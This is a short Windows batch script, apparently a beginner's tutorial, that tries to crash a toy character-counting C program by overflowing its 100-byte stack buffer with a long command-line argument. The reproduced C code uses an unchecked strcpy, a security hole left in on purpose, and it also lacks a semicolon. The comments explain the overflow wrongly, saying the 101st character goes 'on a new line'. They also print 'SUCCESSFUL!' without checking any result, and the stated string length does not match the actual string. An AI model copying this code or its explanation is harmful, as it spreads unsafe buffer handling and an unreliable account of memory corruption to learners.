:: /* KryptonX */
::
:: To use this exploit the following must be in the same directory (as this file):
::		- ccount.exe
::
:: This is a Batch exploit for CCOUNT.EXE
:: The code for this character counting program was taken off:
:: 		- <https://github.com/kryptonX/tinyexploits/blob/master/ccount/src/ccount.c>
:: 		
:: This is for educational purposes! Hacking is not encouraged!
:: Here is the code from the file that makes up CCOUNT.C
:: ---------------------------------------------------------------------------------
:: ######################################################################### 
:: # #include <stdio.h>													   #	
:: # #include <stdlib.h>												   #	
:: # #include <string.h>												   #
:: # 																	   #
:: # void main(int argc, char *argv[]) {								   #
:: #                                                                       #
:: # if (argc > 1) {                                                       #
:: # char line[100] // MAX Line Length									   #
:: #                                                                       #
:: # strcpy(line, argv[1]);                                                #
:: # printf("string was %d characters in length\n",                        #
:: # 		strlen(line));                                                 #
:: #                                                                       #
:: #         }                                                             #
:: #                                                                       #
:: # }																   	   #
:: ######################################################################### 

:: We can finally start the exploitation!
:: The goal is to get the program to perform "weirdly" and crash.
:: Analyzing the code I see that this program appears to be vulnerably to a stack overflow.
:: If I enter 101 character it thinks the first 100 is a line and puts the 101st char on a new line.
:: OVERFLOW!

:: Now let's get into the Batch script!

@echo off
color 1A
goto exploit

:exploit
:: Verify that the program is working correctly...
ccount Verification
:: Attempt and Underflow... (will not work but why not?)
echo SUCCESSFUL!
ccount a
:: Try unusual characters
echo SUCCESSFUL!
ccount #}_
:: Guess what? It did not print at all! First "weird" behavior!
echo UNSUCCESSFUL!
:: The program has a line max of 100 characters . let's one of 128!

ccount thisisastringofover100charactersthatismeanttocrashtheprogramtherealquestioninourcaseisWill101charactersbeenoughtocrashtheprogram


pause